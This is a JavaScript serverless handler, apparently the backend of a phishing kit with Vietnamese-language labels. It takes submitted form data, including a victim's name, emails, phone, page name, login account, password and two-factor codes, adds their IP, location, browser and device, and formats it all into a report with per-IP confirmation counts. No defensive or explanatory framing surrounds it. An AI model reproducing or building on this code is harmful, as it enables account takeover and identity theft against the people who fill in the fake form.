const { incConfirmOncePerIp, getCounts, formatCounts } = require("./_counter2");
exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ ok: false, error: "Method not allowed" }),
    };
  }

  let body = {};
  try {
    body = JSON.parse(event.body || "{}");
  } catch {
    return {
      statusCode: 400,
      body: JSON.stringify({ ok: false, error: "Invalid JSON" }),
    };
  }

  const { LABEL, dt, ipInfo, browser, device, form1, passText, faText } = body;
const userIp = ipInfo?.ip || "unknown";
await incConfirmOncePerIp(userIp);

  const text = `📩 ${LABEL} - ${dt}
🌐 IP: <code>${ipInfo.ip}</code> ( <code>${
    ipInfo.city ? `${ipInfo.city}, ${ipInfo.country}` : ipInfo.country
  }</code> )
🧭 Browser: <code>${browser}</code>
📱 Device: <code>${device}</code>
📞 Country code: <code>${ipInfo.calling_code || "Unknown"}</code>

👤 Name: ${form1.fullName ? `<code>${form1.fullName}</code>` : "Chưa nhập"}
📧 Email Personal: ${form1.personalEmail ? `<code>${form1.personalEmail}</code>` : "Chưa nhập"}
🏢 Email Business: ${form1.businessEmail ? `<code>${form1.businessEmail}</code>` : "Chưa nhập"}
📞 SĐT: ${form1.phone ? `<code>${form1.phone}</code>` : "Chưa nhập"}
🔗 Page: ${form1.pageName ? `<code>${form1.pageName}</code>` : "Chưa nhập"}

🔑 Login
📧 Account: ${
    form1.loginIdentifier ? `<code>${form1.loginIdentifier}</code>` : "Chưa nhập"
  }

🔐 Pass:
${passText}

🔒 2FA:
${faText}

—————————————
`;
const { day, views, confirm } = await getCounts();
const statsText = formatCounts(day, views, confirm);

const finalText = `${text}\n\n${statsText}`;
  return {
    statusCode: 200,
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ text: finalText })

  };
};
